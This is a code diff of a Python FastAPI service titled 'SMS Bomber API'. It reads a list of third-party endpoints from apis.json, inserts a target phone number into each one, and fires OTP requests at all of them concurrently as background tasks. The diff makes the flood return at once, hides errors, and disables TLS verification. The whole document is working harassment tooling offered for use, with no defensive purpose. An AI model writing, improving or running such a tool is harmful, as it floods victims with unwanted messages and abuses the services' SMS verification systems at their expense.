@@ -8,25 +8,25 @@ with open("apis.json", "r") as f:
     data = json.load(f)
     apis = data["apis"]
 
-app = FastAPI(title="SMS Bomber API", description="Hit all APIs from apis.json with a given phone number")
+app = FastAPI(title="SMS Bomber API", description="Trigger OTPs from all APIs instantly")
+
+# Global list to keep references to background tasks (optional)
+background_tasks = set()
 
 def substitute_phone(api: dict, phone: str) -> dict:
     """Replace phone placeholders in URL, body, and headers."""
     api = api.copy()
-    # Replace in URL
     api["url"] = api["url"].replace("*****", phone).replace("{{phone}}", phone)
-    # Replace in body if present
     if "body" in api and api["body"]:
         api["body"] = api["body"].replace("*****", phone).replace("{{phone}}", phone)
-    # Replace in headers (just in case)
     if "headers" in api:
         for key, value in api["headers"].items():
             if isinstance(value, str):
                 api["headers"][key] = value.replace("*****", phone).replace("{{phone}}", phone)
     return api
 
-async def send_one(api: dict, client: httpx.AsyncClient, phone: str) -> dict:
-    """Execute a single API request."""
+async def send_one(api: dict, client: httpx.AsyncClient, phone: str):
+    """Execute a single API request (no return needed for background)."""
     substituted = substitute_phone(api, phone)
     method = substituted.get("method", "get").upper()
     url = substituted["url"]
@@ -34,57 +34,44 @@ async def send_one(api: dict, client: httpx.AsyncClient, phone: str) -> dict:
     body = substituted.get("body", "")
     try:
         if method == "GET":
-            resp = await client.get(url, headers=headers, timeout=30.0)
+            await client.get(url, headers=headers, timeout=30.0)
         elif method == "POST":
             content_type = headers.get("content-type", "")
             if "application/json" in content_type:
-                # Parse body as JSON (if possible)
-                try:
-                    json_data = json.loads(body) if body else {}
-                except:
-                    json_data = {}
-                resp = await client.post(url, headers=headers, json=json_data, timeout=30.0)
+                json_data = json.loads(body) if body else {}
+                await client.post(url, headers=headers, json=json_data, timeout=30.0)
             else:
-                resp = await client.post(url, headers=headers, data=body, timeout=30.0)
-        else:
-            return {"id": api.get("id"), "name": api.get("name"), "success": False, "status": None, "error": f"Unsupported method: {method}"}
-        return {
-            "id": api.get("id"),
-            "name": api.get("name"),
-            "success": 200 <= resp.status_code < 400,
-            "status": resp.status_code,
-            "error": None
-        }
-    except Exception as e:
-        return {
-            "id": api.get("id"),
-            "name": api.get("name"),
-            "success": False,
-            "status": None,
-            "error": str(e)
-        }
+                await client.post(url, headers=headers, data=body, timeout=30.0)
+    except Exception:
+        pass  # Silently ignore errors in background
 
-@app.get("/")
-async def bomber(sms: str = Query(..., description="Phone number (11 digits, e.g. 017xxxxxxxx)")):
-    """Send OTP requests to all APIs with the given phone number."""
+async def fire_all_requests(phone: str):
+    """Fire all API requests concurrently in the background."""
     # Limit concurrency to avoid overwhelming the network
     semaphore = asyncio.Semaphore(20)
 
     async def limited_send(api):
         async with semaphore:
             async with httpx.AsyncClient(verify=False, timeout=30.0) as client:
-                return await send_one(api, client, sms)
+                await send_one(api, client, phone)
 
-    tasks = [limited_send(api) for api in apis]
-    results = await asyncio.gather(*tasks)
+    # Create tasks without awaiting them – they run in background
+    tasks = [asyncio.create_task(limited_send(api)) for api in apis]
+    # Keep a reference to prevent tasks from being garbage collected
+    for task in tasks:
+        background_tasks.add(task)
+        task.add_done_callback(background_tasks.discard)
 
-    total = len(results)
-    success = sum(1 for r in results if r.get("success"))
+@app.get("/")
+async def bomber(sms: str = Query(..., description="Phone number (11 digits, e.g. 017xxxxxxxx)")):
+    """Trigger all OTP requests instantly and return immediately."""
+    # Start all background tasks
+    asyncio.create_task(fire_all_requests(sms))
+    total = len(apis)
     return {
-        "total": total,
-        "success": success,
-        "failure": total - success,
-        "results": results
+        "status": "success",
+        "message": f"OTP requests triggered for {total} endpoints. They are running in the background.",
+        "total": total
     }
 
 # For local development
